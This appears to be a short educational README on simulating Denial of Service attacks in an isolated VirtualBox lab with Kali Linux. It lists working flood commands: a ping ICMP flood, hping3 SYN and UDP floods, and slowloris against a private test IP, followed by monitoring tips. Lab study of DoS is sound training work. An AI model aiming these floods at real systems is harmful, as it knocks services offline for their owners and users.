DoS Attack Simulation using Kali Linux

Disclaimer

This project is intended strictly for educational and ethical cybersecurity training purposes. All simulations must be conducted in a controlled environment (e.g., virtual machines or isolated test networks).  
Do NOT run these simulations on public networks, external systems, or without explicit permission.  
Misuse of this information can result in legal consequences.

Project Description

This project demonstrates how basic Denial of Service (DoS) techniques work by using tools available in Kali Linux.  
The purpose is to help students, cybersecurity enthusiasts, and penetration testers understand the nature of DoS attacks, how they affect systems, and how to detect or mitigate them.

Tools Utilized

The simulation uses the following Kali Linux tools:

- ping – for basic ICMP echo flood simulation.
- hping3 – to simulate TCP SYN or UDP floods.
- slowloris or slowhttptest – for basic application-layer (HTTP) DoS simulation.

Test Environment

Ensure you are running this simulation in:

- A virtual lab (e.g., VirtualBox, VMware)
- With a target machine you own, such as a local web server (Apache, Nginx)
- Within a closed network that does not impact external systems

Example setup:

- Attacker: Kali Linux VM
- Target: Ubuntu Server VM running Apache2
- Network: Host-only or internal network (isolated)

Example Commands

ICMP Flood (Local Test)
In bash,
sudo ping -f 192.168.56.101
TCP SYN Flood (Port 80)

sudo hping3 -S --flood -p 80 192.168.56.101
UDP Flood (Port 53)

sudo hping3 --flood --udp -p 53 192.168.56.101
Slow HTTP Request (Slowloris)

slowloris 192.168.56.101
Replace 192.168.56.101 with the IP of your test server.

While running the simulation, monitor your target machine using tools like:
htop, top – to watch CPU and memory usage
netstat, ss – to view incoming connections
Apache logs – to see request behavior
